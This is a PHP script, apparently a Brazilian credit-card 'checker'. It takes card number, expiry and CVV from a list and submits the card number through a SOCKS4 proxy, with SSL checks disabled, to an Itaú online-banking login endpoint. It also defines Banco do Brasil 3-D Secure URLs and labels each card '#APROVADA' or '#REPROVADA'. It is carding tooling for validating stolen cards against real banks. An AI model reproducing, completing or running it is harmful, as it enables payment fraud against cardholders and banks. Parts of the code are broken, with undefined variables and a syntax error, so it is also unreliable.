<?php
sleep(3);
error_reporting(0);


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

switch ($ano) { 
         case '2018':$mes = '18';break; 
         case '2019':$ano = '19';break; 
         case '2020':$ano = '20';break; 
         case '2021':$ano = '21';break; 
         case '2022':$ano = '22';break; 
         case '2023':$ano = '23';break; 
         case '2024':$ano = '24';break; 
         case '2025':$ano = '25';break; 
         case '2026':$ano = '26';break; 
         case '2027':$ano = '27';break; 
         case '2028':$ano = '28';break; 
}

function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function dadosnome() {
	$nome = file("lista_nomes.txt");
	$mynome = rand(0, sizeof($nome)-1);
	$nome = $nome[$mynome];
	return $nome;
}
function dadossobre() {
	$sobrenome = file("lista_sobrenomes.txt");
	$mysobrenome = rand(0, sizeof($sobrenome)-1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}

function ano12() {
	switch ($ano) {
		case '20': $ano = '2020'; break;
		case '21': $ano = '2021'; break;
		case '22': $ano = '2022'; break;
		case '23': $ano = '2023'; break;
		case '24': $ano = '2024'; break;
		case '25': $ano = '2025'; break;
		case '26': $ano = '2026'; break;
		case '27': $ano = '2027'; break;
		case '28': $ano = '2028'; break;
		case '29': $ano = '2029'; break;
	}}
function mes12() {
	switch ($mes) {
		case '1': $mes = '01'; break;
		case '2': $mes = '02'; break;
		case '3': $mes = '03'; break;
		case '4': $mes = '04'; break;
		case '5': $mes = '05'; break;
		case '6': $mes = '06'; break;
		case '7': $mes = '07'; break;
		case '8': $mes = '08'; break;
		case '9': $mes = '09'; break;
		case '10': $mes = '10'; break;
		case '11': $mes = '11'; break;
		case '12': $mes = '12'; break;
	}}

$mes13 = mes12();
$ano13 = ano12();


$bin = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_result = "$bandeira $banco $level $pais";





function email($nome) {
	$email = preg_replace('<\W+>', "", ).rand(00, 99)."";
	return $email;
}
$nome = dadosnome();
$sobrenome = dadossobre();
$email = email($nome);;


//Hosts BB
if ($bin[0] == 4) {
    $host          = 'www58.bb.com.br';
    $auth          = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb';
    $inicio        = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/inicio.bb';
    $customer      = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/customer.bb';
    $r_customer    = 'https://www58.bb.com.br/ThreeDSecureAuth/gcs/statics/gas/validacao.bb?urlRetorno=/ThreeDSecureAuth/vbvLogin/customer.bb';    
}else {
    $host          = 'www66.bb.com.br';
    $auth          = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/auth.bb';
    $inicio        = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/inicio.bb';
    $customer      = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin/customer.bb';
    $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';    
}

#====================================================================================================#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'proxy.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$proxy = curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, 'https://internetnc1.itau.com.br/router-app/router');

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

	'Host: internetnc1.itau.com.br',
	'Connection: keep-alive',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Origin: https://internetnc.itau.com.br',
        'Upgrade-Insecure-Requests: 1',
	'Content-Type: application/x-www-form-urlencoded',
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
	'Referer: https://internetnc.itau.com.br/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'usuario.cartao='.$cc.'&usuario.cpf=&portal=999&pre-login=pre-login&destino=&tipoLogon=9');
$end = curl_exec($ch);
sleep(3);

$PaReq = getStr2($est3Dgate, 'name="PaReq" value="','"');
$TermUrl = getStr2($est3Dgate, '<input type="hidden" name="TermUrl" value="','"');
$MD = getStr2($end, '<h1>Ol&aacute;,','</h1>');

$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

echo $proxy;


$Retorno = trim(strip_tags(getStr2($end, '<form id="webform0" name="red2ACSv1" method="POST" action="', '" accept_charset="UTF-8">')));

if (strpos($end, 'Digite sua senha')) {
    echo '<span class="badge badge-success"> #APROVADA  </span> <span style="color: LIME;"> → '.$lista.' <span class="badge badge-info">Retorno:</span> ["GG Itau"] Nome: <span class="badge badge-info">'.$MD.'</span>  Bandeira: <span class="badge badge-info">'.$bandeira.'</span> Banco: <span class="badge badge-info">'.$banco.'</span> Level: <span class="badge badge-info">'.$level.'</span> <span class="badge badge-danger"> @PararaioS2 </span></br>';   
}
elseif (strpos($end, 'AcsPreAuthenticationWEB')) {
    echo '<span class="badge badge-success"> #APROVADA  </span> <span style="color: LIME;"> → '.$lista.' <span class="badge badge-info">Retorno:</span> ["GG PAN"]  DEBITOU: DEBITOU: '.$debitouu.' <span class="badge badge-light"> @PararaioS2 </span></br>';   
}
elseif (strpos($end, 'autenticacao.santander.com.br')) {
    echo '<span class="badge badge-success"> #APROVADA  </span> <span style="color: LIME;"> → '.$lista.' <span class="badge badge-info">Retorno:</span> ["GG SANTANDER"] DEBITOU: '.$debitouu.' <span class="badge badge-light"> @PararaioS2 </span></br>';   
}





       else{
         
        
echo '<b> <span class="badge badge-danger" style="background-color: #D84D54; color: #ffffff;"> #REPROVADA </span> <font style="color: white;"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' Invalido ou bloqueado!!!! </font> <font style="color: #ffffff"></font>@PararaioS2 </b>'; 
      } 

      
?>











